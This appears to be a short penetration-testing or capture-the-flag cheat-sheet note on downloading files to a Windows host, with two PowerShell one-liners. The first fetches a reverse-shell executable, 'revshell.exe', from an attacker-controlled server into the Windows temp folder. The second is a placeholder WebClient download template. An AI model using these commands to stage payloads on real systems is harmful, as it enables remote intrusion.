## Downloading files

The first option is better suited !
```powershell
powershell -c "Invoke-WebRequest -Uri 'http://10.9.**.**:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
```

This one did not really work when I tried it.
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<SERVER>/<REMOTE_FILE>','<LOCAL_FILE>')"
```